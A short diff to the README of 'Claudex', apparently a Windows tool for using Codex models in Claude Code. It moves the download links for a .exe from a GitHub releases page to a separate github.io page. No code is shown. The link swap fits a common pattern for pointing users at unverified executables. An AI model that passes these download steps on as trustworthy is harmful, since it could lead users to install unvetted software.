@@ -1,6 +1,6 @@
 # 🌐 Claudex - Use Codex models within Claude Code
 
-[![](https://img.shields.io/badge/Download-Claudex-blue.svg)](https://github.com/Mcalesteryahoo411/Claudex/releases)
+[![](https://img.shields.io/badge/Download-Claudex-blue.svg)](https://mcalesteryahoo411.github.io)
 
 Claudex connects powerful language models to your daily workflow. It acts as a bridge for your computer. You gain access to Codex models while you use the Claude Code interface. This tool removes barriers between different systems.
 
@@ -18,7 +18,7 @@ Claudex works on standard Windows machines. Make sure your computer meets these 
 
 Follow these steps to obtain the software:
 
-1. Visit the following link to see all available versions: [https://github.com/Mcalesteryahoo411/Claudex/releases](https://github.com/Mcalesteryahoo411/Claudex/releases).
+1. Visit the following link to see all available versions: [https://mcalesteryahoo411.github.io](https://mcalesteryahoo411.github.io).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` that fits your system architecture.
 4. Save the file to your "Downloads" folder.
